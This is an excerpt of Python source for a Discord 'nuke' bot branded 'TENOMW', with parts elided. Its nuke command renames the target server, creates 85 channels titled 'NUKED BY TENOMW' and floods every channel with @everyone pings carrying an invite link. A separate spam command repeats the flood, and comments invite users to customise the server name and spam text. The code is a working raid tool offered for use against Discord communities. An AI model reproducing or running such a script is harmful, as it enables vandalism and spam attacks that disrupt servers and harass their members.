...
init()
dr = DR = r = R = cc.LIGHTGREEN_EX
g = G = cc.LIGHTRED_EX
b = B = cc.LIGHTGREEN_EX
m = M = cc.LIGHTRED_EX
c = C = cc.LIGHTGREEN_EX
y = Y = cc.LIGHTRED_EX
w = W = cc.RESET
...
{r}██║░╚███║╚██████╔╝██║░╚██╗███████╗ {m} ██████╦╝╚█████╔╝░░░██║░░░  
{r}╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝ {m} ╚═════╝░░╚════╝░░░░╚═╝░░░
{y}Made By: {g}https://github.com/tenomw-cc'''
...
async def on_ready():
    ...
    await client.change_presence(
        activity=discord.Game('TENOMW https://discord.gg/5Tzr9ZCyYT'))
...
async def nuke(ctx):
    ...
    await ctx.guild.edit(name='TENOMW'
                         )  #Decide what to change the server name to
    ...
    while (n <= 85):
        await guild.create_text_channel(
            'NUKED BY TENOMW'
        )  # Decide what should be the name of the text channels that you will create
        n = n + 1

    for c in ctx.guild.text_channels:
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT '
                     )  # Put the messages you want to be spammed here
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT')
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT')
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT ')
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT ')
...
async def spam(ctx):
    for c in ctx.guild.text_channels:
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT'
                     )  #Put what to be spammed in the brackets
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT ')
        await c.send(
            '@everyone https://discord.gg/5Tzr9ZCyYThttps://discord.gg/5Tzr9ZCyYT'
        )
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT ')
        await c.send('@everyone https://discord.gg/5Tzr9ZCyYT')
